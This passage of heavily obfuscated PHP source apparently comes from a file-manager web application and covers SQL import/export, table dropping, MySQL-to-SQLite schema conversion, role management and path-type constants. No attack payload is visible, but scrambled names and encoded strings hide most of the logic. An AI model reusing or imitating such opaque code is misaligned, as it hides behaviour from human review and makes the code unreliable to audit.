$this->dbType(); $ÖÇ«È‹š = $åîéÁíŸ == $õ§õ£ŞÆ[13] ? 500 : 2000; $òïëùòÒ = basename($¬©şÉ€„, $õ§õ£ŞÆ[829]); $Æàƒ¿‚¢ = 0; $ô¢í«¨› = 4194304 - 104858; $®‹Á°…ú = 1000000 - 104858; while (!feof($È—èÛ…)) { $í«ùã„ = trim(fgets($È—èÛ…)); if (!$í«ùã„) { continue; } $§Ëšüõ– = $this->sqlDecode($í«ùã„, $åîéÁíŸ, $òïëùòÒ); if (stripos($§Ëšüõ–, $õ§õ£ŞÆ[410]) === 0) { if (!$¤²¶—·º) { $¤²¶—·º = $§Ëšüõ– . $õ§õ£ŞÆ[53]; } continue; } if ($íñŞœ£İ) { $íñŞœ£İ->task[$õ§õ£ŞÆ[827]] += 1; } $ª¿‰ü¯ú++; $«¾ë­ê²[] = rtrim(rtrim(trim($§Ëšüõ–), $õ§õ£ŞÆ[50]), $õ§õ£ŞÆ[73]); $ø¢öêÎÄ = null; $¯¿Î‹ß‘ = strlen($§Ëšüõ–); $Æàƒ¿‚¢ += $¯¿Î‹ß‘; if ($Æàƒ¿‚¢ >= ($ÖÇ«È‹š == 500 ? $®‹Á°…ú : $ô¢í«¨›)) { $ø¢öêÎÄ = array_pop($«¾ë­ê²); if ($ª¿‰ü¯ú > 1) { $ª¿‰ü¯ú--; } } if ($ª¿‰ü¯ú >= $ÖÇ«È‹š || $ø¢öêÎÄ) { $§Ëšüõ– = $¤²¶—·º . implode($õ§õ£ŞÆ[50], $«¾ë­ê²); if (!$ÍÙÆõ‰¼->execute($§Ëšüõ–)) { return !1; } if ($íñŞœ£İ) { $íñŞœ£İ->update($ª¿‰ü¯ú); } $«¾ë­ê² = array(); $ª¿‰ü¯ú = 0; $Æàƒ¿‚¢ = 0; if ($ø¢öêÎÄ) { $«¾ë­ê² = array($ø¢öêÎÄ); $ª¿‰ü¯ú = 1; $Æàƒ¿‚¢ = $¯¿Î‹ß‘; } } } fclose($È—èÛ…); if (!empty($«¾ë­ê²)) { $§Ëšüõ– = $¤²¶—·º . implode($õ§õ£ŞÆ[50], $«¾ë­ê²); if (!$ÍÙÆõ‰¼->execute($§Ëšüõ–)) { return !1; } if ($íñŞœ£İ) { $íñŞœ£İ->update($ª¿‰ü¯ú); } } return !0; } public function dropTable($á¤ï–œ¼ = null) { $ĞÔé¥™Ş = $this->model()->db(); $óÁÕ­¢ = $á¤ï–œ¼ ? array($á¤ï–œ¼) : $ĞÔé¥™Ş->getTables(); if (!$óÁÕ­¢) { return; } foreach ($óÁÕ­¢ as $á¤ï–œ¼) { if ($á¤ï–œ¼) { $á¤ï–œ¼ = strtolower($á¤ï–œ¼); } else { continue; } $ĞÔé¥™Ş->execute("\144\x72\157\160\x20\164\x61\142\x6c\x65\x20\151\146\x20\x65\x78\x69\163\x74\x73\40\x60{$á¤ï–œ¼}\x60"); } } private function sqlEncode($½¥ï­Úğ) { $¶±©•—â =& $_SERVER[ •ŒÓîÆ]; $¦¡õÊÓ = array(); foreach ($½¥ï­Úğ as $û‚‚Ë“) { if (is_array($û‚‚Ë“)) { $û‚‚Ë“ = json_encode_force($û‚‚Ë“); } $û‚‚Ë“ = addslashes($û‚‚Ë“); $û‚‚Ë“ = str_replace(array($¶±©•—â[1119], $¶±©•—â[248]), array($¶±©•—â[1120], $¶±©•—â[1121]), $û‚‚Ë“); $¦¡õÊÓ[] = str_replace($¶±©•—â[58], $¶±©•—â[1122], $û‚‚Ë“); } return $¶±©•—â[58] . implode($¶±©•—â[1123], $¦¡õÊÓ) . $¶±©•—â[58]; } private function sqlDecode($ıÍ’ËäÉ, $àù‚¡œ¨, $’ÓõÃì = '') { $çˆó¿ÅÜ =& $_SERVER[ •ŒÓîÆ]; $ıÍ’ËäÉ = str_replace(array($çˆó¿ÅÜ[1120], $çˆó¿ÅÜ[1121]), array($çˆó¿ÅÜ[1119], $çˆó¿ÅÜ[248]), $ıÍ’ËäÉ); if ($àù‚¡œ¨ == $çˆó¿ÅÜ[13]) { return $’ÓõÃì != $çˆó¿ÅÜ[1124] ? stripslashes($ıÍ’ËäÉ) : $ıÍ’ËäÉ; } if ($’ÓõÃì == $çˆó¿ÅÜ[1124]) { $ıÍ’ËäÉ = str_replace($çˆó¿ÅÜ[1125], $çˆó¿ÅÜ[120], stripslashes($ıÍ’ËäÉ)); } return $ıÍ’ËäÉ; } public function getSqlFile($ç¹ÑÌ¥Ë = '') { $öÎıÃõÌ =& $_SERVER[ •ŒÓîÆ]; $Ä¡Æ«å€ = $this->dbType(!0); $áÜøÄ® = CONTROLLER_DIR . "\151\156\163\164\x61\x6c\x6c\x2f\x64\141\164\141\x2f{$Ä¡Æ«å€}\56\x73\x71\154"; $àµà¥Ÿ = file_get_contents($áÜøÄ®); $áëÉâ‚ = $öÎıÃõÌ[1126] . ($Ä¡Æ«å€ == $öÎıÃõÌ[845] ? $öÎıÃõÌ[1127] : $öÎıÃõÌ[1128]) . $öÎıÃõÌ[1129]; preg_match_all($áëÉâ‚, $àµà¥Ÿ, $Â”èÙùä); $¥ö‘â´¡ = $Â”èÙùä[1]; $â±‹ ˜Î = $this->model()->db(); $˜øîòº = $â±‹ ˜Î->getTables(); $°İì´ïŒ = TEMP_FILES . $öÎıÃõÌ[1130] . date($öÎıÃõÌ[266]) . $öÎıÃõÌ[8]; del_dir($°İì´ïŒ); mk_dir($°İì´ïŒ); $ÀÍŸÏÌÓ = $°İì´ïŒ . $öÎıÃõÌ[1131]; $ä½íŸâ¸ = $°İì´ïŒ . $öÎıÃõÌ[1132]; $ª­°ºá = $Ä¡Æ«å€ == $öÎıÃõÌ[13] ? $öÎıÃõÌ[845] : $öÎıÃõÌ[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\x61\x6c\154\x2f\144\141\x74\141\57{$ª­°ºá}\56\163\161\x6c", $°İì´ïŒ); @touch($°İì´ïŒ . $Ä¡Æ«å€ . $öÎıÃõÌ[829]); $İş—ìşÛ = fopen($ÀÍŸÏÌÓ, $öÎıÃõÌ[1107]); $ÔÂíÚè¦ = fopen($ä½íŸâ¸, $öÎıÃõÌ[1107]); if ($Ä¡Æ«å€ == $öÎıÃõÌ[13]) { $˜øîòº = array_diff($˜øîòº, array($öÎıÃõÌ[825], $öÎıÃõÌ[826])); $¤şé÷™ = array($öÎıÃõÌ[1133], $öÎıÃõÌ[1134], $öÎıÃõÌ[1135]); fwrite($ÔÂíÚè¦, implode(PHP_EOL, $¤şé÷™) . PHP_EOL . PHP_EOL); foreach ($˜øîòº as $‚Ãêâ­ü) { $ıòƒ—ˆ = $this->sqlFromSqlite($‚Ãêâ­ü); if (!$ıòƒ—ˆ[$öÎıÃõÌ[13]]) { continue; } fwrite($ÔÂíÚè¦, $ıòƒ—ˆ[$öÎıÃõÌ[13]] . PHP_EOL . PHP_EOL); if (!in_array($‚Ãêâ­ü, $¥ö‘â´¡)) { fwrite($İş—ìşÛ, $ıòƒ—ˆ[$öÎıÃõÌ[845]] . PHP_EOL . PHP_EOL); } } } else { foreach ($˜øîòº as $‚Ãêâ­ü) { $ıòƒ—ˆ = $this->sqlFromMysql($‚Ãêâ­ü); if (!$ıòƒ—ˆ[$öÎıÃõÌ[845]]) { continue; } fwrite($İş—ìşÛ, $ıòƒ—ˆ[$öÎıÃõÌ[845]] . PHP_EOL . PHP_EOL); if (!in_array($‚Ãêâ­ü, $¥ö‘â´¡)) { fwrite($ÔÂíÚè¦, $ıòƒ—ˆ[$öÎıÃõÌ[13]] . PHP_EOL . PHP_EOL); } } } fclose($İş—ìşÛ); fclose($ÔÂíÚè¦); $àµà¥Ÿ = array($öÎıÃõÌ[845] => $ÀÍŸÏÌÓ, $öÎıÃõÌ[13] => $ä½íŸâ¸); return $ç¹ÑÌ¥Ë ? $àµà¥Ÿ[$ç¹ÑÌ¥Ë] : $àµà¥Ÿ; } public function dbType($É¾Ö’©İ = false) { $¸¼ı¬† =& $_SERVER[ •ŒÓîÆ]; $ÊÛ“ûÏ© = $É¾Ö’©İ ? $GLOBALS[$¸¼ı¬†[6]][$¸¼ı¬†[21]] : $this->database; $ÊÛ“ûÏ© = array_change_key_case($ÊÛ“ûÏ©); $»÷çÎš¾ = $ÊÛ“ûÏ©[$¸¼ı¬†[1008]]; if ($»÷çÎš¾ == $¸¼ı¬†[1005]) { $…ëçä¿ = explode($¸¼ı¬†[4], $ÊÛ“ûÏ©[$¸¼ı¬†[1014]]); $»÷çÎš¾ = $…ëçä¿[0]; } $¾¿¶êô‚ = array($¸¼ı¬†[1136] => $¸¼ı¬†[13], $¸¼ı¬†[953] => $¸¼ı¬†[845]); if (isset($¾¿¶êô‚[$»÷çÎš¾])) { $»÷çÎš¾ = $¾¿¶êô‚[$»÷çÎš¾]; } return $»÷çÎš¾; } public function sqlFromMysql($Î©˜’ûë, $ šï‰ì» = '') { $¤ÈÙÓƒÙ =& $_SERVER[ •ŒÓîÆ]; $âóÊ–çô = $this->model()->db(); $æ»ÎÚ¿Ä = $âóÊ–çô->query($¤ÈÙÓƒÙ[1137] . $Î©˜’ûë . $¤ÈÙÓƒÙ[439]); if (!$æ»ÎÚ¿Ä || !$æ»ÎÚ¿Ä[0]) { return !1; } $äç×£¦¢ = _get($æ»ÎÚ¿Ä[0], $¤ÈÙÓƒÙ[1138], $¤ÈÙÓƒÙ[12]); if (!$äç×£¦¢) { return !1; } $öÆç­çı = "\x44\122\x4f\x50\x20\x54\101\102\114\x45\40\x49\x46\40\105\130\111\x53\124\123\x20\140{$Î©˜’ûë}\x60\73" . PHP_EOL . $äç×£¦¢ . $¤ÈÙÓƒÙ[73]; if ($ šï‰ì» && $ šï‰ì» == $¤ÈÙÓƒÙ[845]) { return $öÆç­çı; } $µ¹¼ïÑ„ = array_change_key_case($GLOBALS[$¤ÈÙÓƒÙ[6]][$¤ÈÙÓƒÙ[21]]); $ôÄ»œù = $µ¹¼ïÑ„[$¤ÈÙÓƒÙ[1013]]; $ïé•ÚÏ» = $¤ÈÙÓƒÙ[1139] . $ôÄ»œù . $¤ÈÙÓƒÙ[1140] . $Î©˜’ûë . $¤ÈÙÓƒÙ[58]; $–µ°¼¨› = $¤ÈÙÓƒÙ[1141] . $Î©˜’ûë . $¤ÈÙÓƒÙ[941]; $£„ù£Û = $âóÊ–çô->query($ïé•ÚÏ»); if (empty($£„ù£Û)) { $¯®Á‚ùå = array($¤ÈÙÓƒÙ[845] => $¤ÈÙÓƒÙ[12], $¤ÈÙÓƒÙ[13] => $¤ÈÙÓƒÙ[12]); return $ šï‰ì» ? $¯®Á‚ùå[$ šï‰ì»] : $¯®Á‚ùå; } $‰º°ÙúÇ = $âóÊ–çô->query($–µ°¼¨›); $Ÿã¿€Òø = $¤ÈÙÓƒÙ[12]; $³ë®â±Ë = array(); foreach ($‰º°ÙúÇ as $€Çœğâ) { if (!$Ÿã¿€Òø && $€Çœğâ[$¤ÈÙÓƒÙ[1142]] == $¤ÈÙÓƒÙ[1143]) { $Ÿã¿€Òø = $€Çœğâ[$¤ÈÙÓƒÙ[1144]]; } if (isset($³ë®â±Ë[$€Çœğâ[$¤ÈÙÓƒÙ[1142]]])) { $³ë®â±Ë[$€Çœğâ[$¤ÈÙÓƒÙ[1142]]][$¤ÈÙÓƒÙ[1145]][] = $€Çœğâ[$¤ÈÙÓƒÙ[1144]]; continue; } $³ë®â±Ë[$€Çœğâ[$¤ÈÙÓƒÙ[1142]]] = array($¤ÈÙÓƒÙ[1146] => $€Çœğâ[$¤ÈÙÓƒÙ[1142]], $¤ÈÙÓƒÙ[1145] => array($€Çœğâ[$¤ÈÙÓƒÙ[1144]]), $¤ÈÙÓƒÙ[1147] => $€Çœğâ[$¤ÈÙÓƒÙ[1148]] == $¤ÈÙÓƒÙ[90] ? 0 : 1); } $…í¼òèˆ = array(); foreach ($³ë®â±Ë as $€Çœğâ) { $Òü¦ˆˆª = $€Çœğâ[$¤ÈÙÓƒÙ[1146]] == $¤ÈÙÓƒÙ[1143]; $æÊÏ”‹  = array($¤ÈÙÓƒÙ[1149], $€Çœğâ[$¤ÈÙÓƒÙ[1147]] == $¤ÈÙÓƒÙ[90] && !$Òü¦ˆˆª ? $¤ÈÙÓƒÙ[1150] : $¤ÈÙÓƒÙ[12], $¤ÈÙÓƒÙ[1151], $¤ÈÙÓƒÙ[1152] . $Î©˜’ûë . $¤ÈÙÓƒÙ[11] . ($Òü¦ˆˆª ? $¤ÈÙÓƒÙ[1153] : $€Çœğâ[$¤ÈÙÓƒÙ[1146]]) . $¤ÈÙÓƒÙ[120], $¤ÈÙÓƒÙ[1154], $¤ÈÙÓƒÙ[120] . $Î©˜’ûë . $¤ÈÙÓƒÙ[120], $¤ÈÙÓƒÙ[1155] . implode($¤ÈÙÓƒÙ[1156], $€Çœğâ[$¤ÈÙÓƒÙ[1145]]) . $¤ÈÙÓƒÙ[1157]); $…í¼òèˆ[] = implode($¤ÈÙÓƒÙ[53], $æÊÏ”‹ ) . $¤ÈÙÓƒÙ[73]; } $š Öİ£ = array(); $íÕšä = array($¤ÈÙÓƒÙ[1158] => $¤ÈÙÓƒÙ[1159], $¤ÈÙÓƒÙ[1159] => $¤ÈÙÓƒÙ[1159], $¤ÈÙÓƒÙ[343] => $¤ÈÙÓƒÙ[370], $¤ÈÙÓƒÙ[342] => $¤ÈÙÓƒÙ[370]); foreach ($£„ù£Û as $€Çœğâ) { $æÊÏ”‹  = array($¤ÈÙÓƒÙ[120] . $€Çœğâ[$¤ÈÙÓƒÙ[1160]] . $¤ÈÙÓƒÙ[120], isset($íÕšä[$€Çœğâ[$¤ÈÙÓƒÙ[1161]]]) ? $íÕšä[$€Çœğâ[$¤ÈÙÓƒÙ[1161]]] : $€Çœğâ[$¤ÈÙÓƒÙ[1162]], $€Çœğâ[$¤ÈÙÓƒÙ[1163]] == $¤ÈÙÓƒÙ[939] ? $¤ÈÙÓƒÙ[1164] : $¤ÈÙÓƒÙ[1165], $€Çœğâ[$¤ÈÙÓƒÙ[1160]] == $Ÿã¿€Òø ? $¤ÈÙÓƒÙ[1166] : $¤ÈÙÓƒÙ[12], $€Çœğâ[$¤ÈÙÓƒÙ[990]] ? strtoupper(str_replace($¤ÈÙÓƒÙ[11], $¤ÈÙÓƒÙ[12], $€Çœğâ[$¤ÈÙÓƒÙ[990]])) : $¤ÈÙÓƒÙ[12]); $š Öİ£[] = trim(implode($¤ÈÙÓƒÙ[53], $æÊÏ”‹ )); } $•àˆáÏ = array($¤ÈÙÓƒÙ[1167] . $Î©˜’ûë . $¤ÈÙÓƒÙ[1168], $¤ÈÙÓƒÙ[1169] . $Î©˜’ûë . $¤ÈÙÓƒÙ[1170], implode($¤ÈÙÓƒÙ[50] . PHP_EOL, $š Öİ£), $¤ÈÙÓƒÙ[987]); $®Ò³†Õ² = implode(PHP_EOL, array_merge($•àˆáÏ, $…í¼òèˆ)); if ($ šï‰ì» && $ šï‰ì» == $¤ÈÙÓƒÙ[13]) { return $®Ò³†Õ²; } $¯®Á‚ùå = array($¤ÈÙÓƒÙ[845] => $öÆç­çı, $¤ÈÙÓƒÙ[13] => $®Ò³†Õ²); return $ šï‰ì» ? $¯®Á‚ùå[$ šï‰ì»] : $¯®Á‚ùå; } public function sqlFromSqlite($®¬ÕÓš¼, $„û·êŸä = '') { $ù›˜ïñ¢ =& $_SERVER[ •ŒÓîÆ]; $à™ñí­˜ = $this->model()->db(); $ÕÊÏËÈû = "\x50\122\x41\x47\x4d\101\40\124\x41\x42\114\105\x5f\x49\x4e\x46\117\40\x28\x27{$®¬ÕÓš¼}\47\x29"; $öˆØ„Õ§ = "\x53\105\114\105\x43\124\x20\52\x20\x46\x52\x4f\115\40\x73\161\x6c\151\164\x65\137\155\141\x73\x74\145\162\x20\127\x48\x45\122\x45\x20\x74\x62\154\137\x6e\x61\x6d\145\x20\x3d\x20\47{$®¬ÕÓš¼}\47"; $ÍÏ¾µ‰ = $à™ñí­˜->query($ÕÊÏËÈû); if (empty($ÍÏ¾µ‰)) { $µ¶Åƒ‚ = array($ù›˜ïñ¢[845] => $ù›˜ïñ¢[12], $ù›˜ïñ¢[13] => $ù›˜ïñ¢[12]); return $„û·êŸä ? $µ¶Åƒ‚[$„û·êŸä] : $µ¶Åƒ‚; } $½İøÓÕ = $à™ñí­˜->query($öˆØ„Õ§); $‰˜É»ßö = $éíúİ¶ = array(); foreach ($½İøÓÕ as $İ„«ƒÇÔ) { if ($İ„«ƒÇÔ[$ù›˜ïñ¢[33]] == $ù›˜ïñ¢[334]) { $‰˜É»ßö[] = $İ„«ƒÇÔ[$ù›˜ïñ¢[1171]]; } else { $éíúİ¶[$İ„«ƒÇÔ[$ù›˜ïñ¢[32]]] = $İ„«ƒÇÔ[$ù›˜ïñ¢[1171]]; } } $şÓ¿ÈÙŒ = array_merge(array($ù›˜ïñ¢[1167] . $®¬ÕÓš¼ . $ù›˜ïñ¢[120]), $‰˜É»ßö, array_values($éíúİ¶)); $şÓ¿ÈÙŒ = implode($ù›˜ïñ¢[73] . PHP_EOL, $şÓ¿ÈÙŒ) . $ù›˜ïñ¢[73]; if ($„û·êŸä && $„û·êŸä == $ù›˜ïñ¢[13]) { return $şÓ¿ÈÙŒ; } $¾É‰Ñ© = array(); $ôñÏ­†š = array($ù›˜ïñ¢[1159] => $ù›˜ïñ¢[1172], $ù›˜ïñ¢[370] => $ù›˜ïñ¢[1173]); $ÇáÇÈªš = $ù›˜ïñ¢[12]; foreach ($ÍÏ¾µ‰ as $İ„«ƒÇÔ) { if ($İ„«ƒÇÔ[$ù›˜ïñ¢[57]] == $ù›˜ïñ¢[90]) { $ÇáÇÈªš = $İ„«ƒÇÔ[$ù›˜ïñ¢[32]]; } $ÀÆ‘„î¤ = array($ù›˜ïñ¢[439] . $İ„«ƒÇÔ[$ù›˜ïñ¢[32]] . $ù›˜ïñ¢[439], isset($ôñÏ­†š[$İ„«ƒÇÔ[$ù›˜ïñ¢[33]]]) ? $ôñÏ­†š[$İ„«ƒÇÔ[$ù›˜ïñ¢[33]]] : $İ„«ƒÇÔ[$ù›˜ïñ¢[33]], $İ„«ƒÇÔ[$ù›˜ïñ¢[35]] == $ù›˜ïñ¢[90] ? $ù›˜ïñ¢[1164] : $ù›˜ïñ¢[1174] . $İ„«ƒÇÔ[$ù›˜ïñ¢[56]], $İ„«ƒÇÔ[$ù›˜ïñ¢[57]] == $ù›˜ïñ¢[90] ? $ù›˜ïñ¢[1175] : $ù›˜ïñ¢[12]); $¾É‰Ñ©[] = trim(implode($ù›˜ïñ¢[53], $ÀÆ‘„î¤)); } foreach ($éíúİ¶ as $·ªÎéµ => $Š¢£†™û) { $˜­Ìô¦Œ = str_replace($ù›˜ïñ¢[1176] . $®¬ÕÓš¼ . $ù›˜ïñ¢[11], $ù›˜ïñ¢[12], $·ªÎéµ); $óÙóç… = str_replace(array($ù›˜ïñ¢[120], $ù›˜ïñ¢[998]), $ù›˜ïñ¢[439], substr($Š¢£†™û, stripos($Š¢£†™û, $ù›˜ïñ¢[315]))); if ($˜­Ìô¦Œ == $ù›˜ïñ¢[1153]) { $ÂîÜ†×Û = $ù›˜ïñ¢[1177] . $ÇáÇÈªš . $ù›˜ïñ¢[1178]; } else { $ÂîÜ†×Û = (stripos($˜­Ìô¦Œ, $ù›˜ïñ¢[11]) ? $ù›˜ïñ¢[1179] : $ù›˜ïñ¢[12]) . ($ù›˜ïñ¢[1180] . $˜­Ìô¦Œ . $ù›˜ïñ¢[1181] . $óÙóç…); } $¾É‰Ñ©[] = $ÂîÜ†×Û; } $€ëË´Ï³ = array($ù›˜ïñ¢[1182] . $®¬ÕÓš¼ . $ù›˜ïñ¢[1183], $ù›˜ïñ¢[1184] . $®¬ÕÓš¼ . $ù›˜ïñ¢[1185], implode($ù›˜ïñ¢[50] . PHP_EOL, $¾É‰Ñ©), $ù›˜ïñ¢[1186]); $á¬”Ó¾Ó = implode(PHP_EOL, $€ëË´Ï³); if ($„û·êŸä && $„û·êŸä == $ù›˜ïñ¢[845]) { return $á¬”Ó¾Ó; } $µ¶Åƒ‚ = array($ù›˜ïñ¢[845] => $á¬”Ó¾Ó, $ù›˜ïñ¢[13] => $şÓ¿ÈÙŒ); return $„û·êŸä ? $µ¶Åƒ‚[$„û·êŸä] : $µ¶Åƒ‚; } } goto FÛº¿ß‡; a‘ã‚°ì‡£: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\x73\x79\x73\164\145\x6d\137\157\160\164\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\x72\x6f\x6c\145", "\162\157\x6c\145\107\162\157\165\160", "\162\x65\x67\151\x73\x74", "\x65\155\141\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($şÑ¹ö§’) { return "\x53\171\x73\x74\x65\x6d\x4f\x70\x74\151\157\156\137{$şÑ¹ö§’}"; } protected function optionDefault($ıçˆ¨²ì = '') { $–¢Æ—¡÷ =& $_SERVER[ •ŒÓîÆ]; if ($ıçˆ¨²ì == $–¢Æ—¡÷[12]) { return $GLOBALS[$–¢Æ—¡÷[6]][$–¢Æ—¡÷[435]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\x2e\x72\157\154\145\114\151\163\x74"; public $field = array("\156\x61\155\145", "\141\x75\x74\x68", "\x6c\x61\142\145\154", "\144\151\x73\x70\154\141\x79", "\163\171\x73\x74\x65\155", "\x64\x65\x73\x63", "\x69\147\156\x6f\162\x65\x45\x78\x74", "\151\147\156\157\162\x65\106\151\x6c\x65\x53\x69\172\145", "\141\144\155\x69\156\151\163\x74\x72\x61\164\x6f\x72", "\163\157\162\x74"); public function listData($«™‚ö´  = false, $Ùğ±¶ªè = "\x73\157\x72\164", $óÉ·ÍôÁ = false) { $ÜÂşıô =& $_SERVER[ •ŒÓîÆ]; $Èã…ì„ = parent::listData($«™‚ö´ , $Ùğ±¶ªè, $óÉ·ÍôÁ); if (!$«™‚ö´ ) { foreach ($Èã…ì„ as $ŞâÑ÷¤¢ => $÷’¨†’”) { if ($÷’¨†’”[$ÜÂşıô[2090]] == 1) { $Èã…ì„[$ŞâÑ÷¤¢][$ÜÂşıô[505]] = LNG($ÜÂşıô[2329]); } } } return $Èã…ì„; } public function update($±”æØ¢È, $”İß€Ş) { $ÚíµŸ£ =& $_SERVER[ •ŒÓîÆ]; $Ì…´¡œê = parent::listData($±”æØ¢È); $ãïè’ = $this->findByName($”İß€Ş[$ÚíµŸ£[32]]); if (!$Ì…´¡œê || $ãïè’ && $ãïè’[$ÚíµŸ£[453]] != $Ì…´¡œê[$ÚíµŸ£[453]]) { return !1; } if ($ãïè’[$ÚíµŸ£[2090]] == 1) { $”İß€Ş = array($ÚíµŸ£[32] => $”İß€Ş[$ÚíµŸ£[32]], $ÚíµŸ£[1911] => $”İß€Ş[$ÚíµŸ£[1911]]); } $this->filterAuth($”İß€Ş[$ÚíµŸ£[466]]); return parent::update($±”æØ¢È, $”İß€Ş); } public function remove($ıåôëƒ›) { $È„ãÍ–ş = parent::listData($ıåôëƒ›); if (!$È„ãÍ–ş || $È„ãÍ–ş[$_SERVER[ •ŒÓîÆ][181]]) { return !1; } return parent::remove($ıåôëƒ›); } public function add($Âï¤§Ñ) { $Õüı²¹ç =& $_SERVER[ •ŒÓîÆ]; $„‹ã×¾ = $Âï¤§Ñ[$Õüı²¹ç[32]]; if ($this->findByName($„‹ã×¾)) { return !1; } $ãÂúë¨” = array($Õüı²¹ç[473] => $„‹ã×¾, $Õüı²¹ç[1894] => $Õüı²¹ç[12], $Õüı²¹ç[1890] => $Õüı²¹ç[1898], $Õüı²¹ç[2330] => 1, $Õüı²¹ç[1893] => 0, $Õüı²¹ç[2331] => 0, $Õüı²¹ç[1892] => $this->getSort()); $Âï¤§Ñ = array_merge($ãÂúë¨”, $Âï¤§Ñ); $this->filterAuth($Âï¤§Ñ[$Õüı²¹ç[466]]); return parent::insert($Âï¤§Ñ); } private function getSort() { $†“ü½¼” =& $_SERVER[ •ŒÓîÆ]; $ô¼ï«»È = parent::listData(); $š¹Ğ‚ÙÕ = array_to_keyvalue($ô¼ï«»È, $†“ü½¼”[12], $†“ü½¼”[1912]); return empty($š¹Ğ‚ÙÕ) ? 0 : max($š¹Ğ‚ÙÕ) + 1; } private function filterAuth(&$ç·‚¥ì) { $¹ãü­åè =& $_SERVER[ •ŒÓîÆ]; $Ş§ß»ÁŒ = array(); $²¿Ò³öÓ = array_filter(explode($¹ãü­åè[50], $ç·‚¥ì)); foreach ($²¿Ò³öÓ as $ç·‚¥ì) { $åŸ†ÛóÚ = explode($¹ãü­åè[10], $ç·‚¥ì); if ($åŸ†ÛóÚ[0] == $¹ãü­åè[2332] && $åŸ†ÛóÚ[1] != $¹ãü­åè[1231]) { $üš¤„— = $åŸ†ÛóÚ[0] . $¹ãü­åè[10] . $åŸ†ÛóÚ[1] . $¹ãü­åè[2333]; if (!in_array($üš¤„—, $²¿Ò³öÓ)) { $Ş§ß»ÁŒ[] = $üš¤„—; } } $Ş§ß»ÁŒ[] = $ç·‚¥ì; } $ç·‚¥ì = implode($¹ãü­åè[50], $Ş§ß»ÁŒ); } public function findRoleDefault() { $Ÿ“·Ï¦´ =& $_SERVER[ •ŒÓîÆ]; $¾ÖæØå° = parent::listData(); $©íıŞ¥§ = !1; foreach ($¾ÖæØå° as $•Î™Š¬Ã) { if (!$•Î™Š¬Ã || $•Î™Š¬Ã[$Ÿ“·Ï¦´[1910]] == $Ÿ“·Ï¦´[214] || $•Î™Š¬Ã[$Ÿ“·Ï¦´[2090]] == 1) { continue; } if (strstr($•Î™Š¬Ã[$Ÿ“·Ï¦´[466]], $Ÿ“·Ï¦´[2334])) { continue; } if (!strstr($•Î™Š¬Ã[$Ÿ“·Ï¦´[466]], $Ÿ“·Ï¦´[2335])) { continue; } if (!$©íıŞ¥§) { $©íıŞ¥§ = $•Î™Š¬Ã; continue; } $å·§†¡â = explode($Ÿ“·Ï¦´[50], $©íıŞ¥§[$Ÿ“·Ï¦´[466]]); $»Ëò‘š¢ = explode($Ÿ“·Ï¦´[50], $•Î™Š¬Ã[$Ÿ“·Ï¦´[466]]); if (count($å·§†¡â) > count($»Ëò‘š¢)) { $©íıŞ¥§ = $•Î™Š¬Ã; } } return $©íıŞ¥§ ? $©íıŞ¥§[$Ÿ“·Ï¦´[453]] : $Ÿ“·Ï¦´[12]; } public function sort($°ğÜ™Óû, $Å¿ì¦şÇ) { return parent::update($°ğÜ™Óû, $Å¿ì¦şÇ); } } goto fŞ®…èÀã±; aï‰ï‰‚Ò‹: class KodIO { const KOD_SOURCE = "\173\x73\157\x75\162\143\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\163\145\x72\122\145\x63\171\x63\154\x65\175"; const KOD_USER_FAV = "\x7b\165\x73\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\162\x46\x69\154\x65\x54\x61\147\x7d"; const KOD_USER_FILE_TYPE = "\173\x75\163\145\162\x46\151\154\x65\x54\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\147\x72\157\165\160\122\x6f\157\164\123\145\154\x66\x7d"; const KOD_USER_SHARE = "\173\x75\163\x65\x72\123\150\x61\162\x65\175"; const KOD_USER_SHARE_LINK = "\x7b\165\163\145\x72\123\x68\x61\162\145\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\x61\162\x65\x54\x6f\115\145\175"; const KOD_SHARE_ITEM = "\173\163\150\141\162\145\111\164\x65\155\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\141\x72\145\x49\164\145\155\x4c\x69\156\x6b\175"; const KOD_SEARCH = "\173\163\145\x61\x72\143\x68\175"; const KOD_BLOCK = "\x7b\142\x6c\x6f\x63\153\x7d"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\163\145\x72\122\x65\x6e\143\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\x65\162\175"; public static function typeList() { $Íƒ®Ñë¡ =& $_SERVER[ •ŒÓîÆ]; return array($Íƒ®Ñë¡[1292] => self::KOD_SOURCE, $Íƒ®Ñë¡[1293] => self::KOD_USER_RECYCLE, $Íƒ®Ñë¡[1294] => self::KOD_USER_FAV, $Íƒ®Ñë¡[1295] => self::KOD_USER_FILE_TAG, $Íƒ®Ñë¡[1296] => self::KOD_USER_FILE_TYPE, $Íƒ®Ñë¡[1297] => self::KOD_GROUP_ROOT_SELF, $Íƒ®Ñë¡[1298] => self::KOD_USER_SHARE, $Íƒ®Ñë¡[1299] => self::KOD_USER_SHARE_LINK, $Íƒ®Ñë¡[1300] => self::KOD_USER_SHARE_TO_ME, $Íƒ®Ñë¡[1301] => self::KOD_SHARE_ITEM, $Íƒ®Ñë¡[1302] => self::KOD_SHARE_LINK, $Íƒ®Ñë¡[1303] => self::KOD_SEARCH, $Íƒ®Ñë¡[1304] => self::KOD_BLOCK, $Íƒ®Ñë¡[1305] => self::KOD_IO, $Íƒ®Ñë¡[1306] => self::KOD_USER_RECENT, $Íƒ®Ñë¡[1307] => self::KOD_USER_DRIVER); } public static function parse($Ô¶í‚ä) { $óŒ¨áÖÂ =& $_SERVER[ •ŒÓîÆ]; $Ô¶í‚ä = self::clear($Ô¶í‚ä); $­ÛØÂªş = array_values(self::typeList()); preg_match($óŒ¨áÖÂ[1308], $Ô¶í‚ä, $œ•×ŠÈù); $ÚõõÂ– = array($óŒ¨áÖÂ[475] => !1, $óŒ¨áÖÂ[1309] => !1, $óŒ¨áÖÂ[472] => !1, $óŒ¨áÖÂ[86] => 